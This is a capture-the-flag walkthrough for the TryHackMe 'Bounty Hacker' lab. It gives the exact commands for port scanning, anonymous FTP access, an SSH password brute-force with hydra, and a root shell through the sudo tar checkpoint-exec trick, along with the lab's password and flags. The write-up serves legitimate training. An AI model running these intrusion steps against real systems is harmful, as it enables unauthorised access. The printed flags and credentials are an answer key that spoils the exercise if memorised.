# [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Task 1 - Living up to the title.

### Question: Deploy the machine.
```
Answer: No answer needed
```
---
### Question: Find open ports on the machine
* Begin by scanning the network

`nmap -sV -sC [IP address]`
* Open ports are `ftp`, `ssh`, and `http`
```
Answer: No answer needed
```
---
### Question: Who wrote the task list?
* Anonymous FTP access is allowed

`ftp anonymous@[IP address]`
* If the error `Entering Extended Passive Mode` appears, Ctrl+C and try:
  * `ftp anonymous@[IP address]`, then
  * `passive`
* Found 2 files:
  * `locks.txt`
    * Looks like potential usernames or passwords
  * `task.txt`
    * Reading the file, we discover who wrote it
```
Answer: lin
```
---
### Question: What service can you bruteforce with the text file found?
* Hint tells us it's on port 22
```
Answer: ssh
```
---
### Question: What is the users password?
* We can use hydra to try to brute force the password with the information we obtained

`hydra -l lin -P locks.txt ssh://[IP address]`
```
Answer: RedDr4gonSynd1cat3
```
---
### Question: user.txt
* With these credentials, we can ssh into the server

`ssh lin@10.10.112.195`
* We find the `user.txt` file in the `Desktop` directory
```
Answer: THM{CR1M3_SyNd1C4T3}
```
---
### Question: root.txt
* We can't `cd` into the `root` directory
* Running `sudo -l` reveals that we can use ` (root) /bin/tar` command
* [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) can help us escalate privileges using `tar`
* Let's try this:

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
* We have a shell and `whoami` shows that we're `root`
* Navigate to the `root` directory and view the contents of `root.txt`
```
Answer: THM{80UN7Y_h4cK3r}
```